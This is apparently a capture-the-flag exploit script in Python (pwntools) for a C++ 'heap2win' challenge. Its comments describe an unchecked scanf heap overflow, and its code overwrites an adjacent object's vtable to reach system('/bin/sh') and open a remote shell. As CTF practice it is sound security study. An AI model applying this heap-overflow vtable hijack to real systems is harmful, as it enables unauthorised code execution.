from pwn import ELF, context, p64, remote

# The challenge binary implements a button factory in C++ (see main.cpp).
#
# Relevant classes:
#   Button          - base class with virtual push()
#   HypeButton      - prints "HYPE HYPE HYPE"
#   CustomButton    - scanf("%s") into char name[0x10], then prints the name three times
#   WinnerButton    - prints "WINNER" and calls system("/bin/sh")
#
# Application stores Button* in a std::vector<Button*> button_list.
# The menu only allows creating HypeButton (1) or CustomButton (2).
# Choosing WinnerButton (3) prints a rejection message and does not allocate one.
#
# However, main() executes:
#   WinnerButton *but = new WinnerButton();
# before app->run(). The WinnerButton vtable pointer is therefore present at a
# fixed address (0x403640, no PIE).
#
# Vulnerability: CustomButton uses scanf("%s", name) with no length check.
# The name field is only 0x10 bytes. Extra bytes overwrite the rest of the
# CustomButton heap chunk and, depending on layout, the following chunk.
#
# Heap layout trick:
#   1. Create two HypeButtons. The vector's internal pointer array grows.
#   2. When a third button is added, vector reallocation frees the old array.
#   3. The CustomButton allocation can reuse that freed space, landing next to
#      the second HypeButton object on the heap.
#   4. Overflow: 16 bytes fill name, then 8 bytes fake chunk size (0x21),
#      then 8 bytes overwrite the adjacent object's vtable with WINNER_VTABLE.
#   5. pushButton(2) calls push() on the corrupted object -> shell.
#
# checksec: Full RELRO (no GOT), NX, no canary, no PIE.

context.log_level = "debug"
context.arch = "amd64"
context.cyclic_size = 8
elf = context.binary = ELF("./heap2win")
# p = remote("127.0.0.1", 9001)
p = remote("chals.cyberjousting.com", 1364)

WINNER_VTABLE = 0x403640


def make_hype():
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"Enter your choice (1-3): ", b"1")


def make_custom(name):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"Enter your choice (1-3): ", b"2")
    p.sendlineafter(b"custom button!\n", name)


def push_button(idx):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b">> ", str(idx).encode())


make_hype()
make_hype()

payload = b"A" * 16 + p64(0x21) + p64(WINNER_VTABLE)
make_custom(payload)

push_button(2)

p.interactive()
